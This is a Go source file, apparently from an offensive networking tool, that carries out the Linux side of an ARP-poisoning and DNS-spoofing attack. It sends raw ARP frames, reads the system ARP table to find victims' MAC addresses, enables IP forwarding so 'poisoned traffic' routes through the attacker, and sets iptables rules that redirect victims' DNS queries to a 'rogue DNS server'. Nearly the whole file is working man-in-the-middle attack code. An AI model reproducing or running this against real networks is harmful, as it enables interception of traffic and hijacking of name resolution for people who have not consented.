// +build linux

package dns

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

// Linux-specific raw socket operations for ARP poisoning

// openRawSocket opens a raw AF_PACKET socket for sending raw Ethernet frames
func openRawSocket(ifaceIndex int) (int, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ARP)))
	if err != nil {
		return -1, fmt.Errorf("socket() failed (requires root/CAP_NET_RAW): %w", err)
	}
	return fd, nil
}

// closeRawSocket closes the raw socket
func closeRawSocket(fd int) {
	syscall.Close(fd)
}

// sendOnSocket sends a raw packet on the given socket
func sendOnSocket(fd int, ifaceIndex int, packet []byte) error {
	addr := syscall.SockaddrLinklayer{
		Protocol: htons(syscall.ETH_P_ARP),
		Ifindex:  ifaceIndex,
	}
	return syscall.Sendto(fd, packet, 0, &addr)
}

// htons converts a uint16 from host byte order to network byte order
func htons(v uint16) uint16 {
	return (v<<8)&0xff00 | (v>>8)&0xff
}

// getARPEntry reads the system ARP table to find a MAC for the given IP
func getARPEntry(ip net.IP) (net.HardwareAddr, error) {
	f, err := os.Open("/proc/net/arp")
	if err != nil {
		return nil, err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	scanner.Scan() // Skip header line

	targetIP := ip.String()
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) >= 4 && fields[0] == targetIP {
			mac, err := net.ParseMAC(fields[3])
			if err != nil {
				return nil, err
			}
			// Skip incomplete entries (00:00:00:00:00:00)
			if mac.String() == "00:00:00:00:00:00" {
				continue
			}
			return mac, nil
		}
	}

	return nil, fmt.Errorf("no ARP entry for %s", targetIP)
}

// triggerARPResolution sends a ping to force ARP resolution
func triggerARPResolution(ip net.IP) {
	cmd := exec.Command("ping", "-c", "1", "-W", "1", ip.String())
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Run()
}

// enableIPForwarding enables IP forwarding on Linux so poisoned traffic
// can be forwarded through our machine to the real gateway
func EnableIPForwarding() error {
	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)
}

// disableIPForwarding disables IP forwarding
func DisableIPForwarding() error {
	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("0"), 0644)
}

// setupIPTables configures iptables to redirect DNS traffic (port 53) to our
// rogue DNS server, while forwarding all other traffic normally
func SetupIPTables(listenPort int) error {
	commands := [][]string{
		// Redirect incoming DNS (UDP 53) to our spoofer
		{"iptables", "-t", "nat", "-A", "PREROUTING", "-p", "udp", "--dport", "53",
			"-j", "REDIRECT", "--to-port", fmt.Sprintf("%d", listenPort)},
		// Redirect incoming DNS (TCP 53) to our spoofer
		{"iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "53",
			"-j", "REDIRECT", "--to-port", fmt.Sprintf("%d", listenPort)},
		// Allow forwarding
		{"iptables", "-A", "FORWARD", "-j", "ACCEPT"},
		// NAT outgoing traffic
		{"iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"},
	}

	for _, args := range commands {
		cmd := exec.Command(args[0], args[1:]...)
		if output, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("iptables command failed: %s: %w", string(output), err)
		}
	}

	return nil
}

// CleanupIPTables removes the iptables rules we added
func CleanupIPTables(listenPort int) {
	commands := [][]string{
		{"iptables", "-t", "nat", "-D", "PREROUTING", "-p", "udp", "--dport", "53",
			"-j", "REDIRECT", "--to-port", fmt.Sprintf("%d", listenPort)},
		{"iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--dport", "53",
			"-j", "REDIRECT", "--to-port", fmt.Sprintf("%d", listenPort)},
		{"iptables", "-D", "FORWARD", "-j", "ACCEPT"},
		{"iptables", "-t", "nat", "-D", "POSTROUTING", "-j", "MASQUERADE"},
	}

	for _, args := range commands {
		cmd := exec.Command(args[0], args[1:]...)
		cmd.Run() // Ignore errors during cleanup
	}
}

// Ensure unsafe is referenced (needed for potential future syscall use)
var _ = unsafe.Pointer(nil)
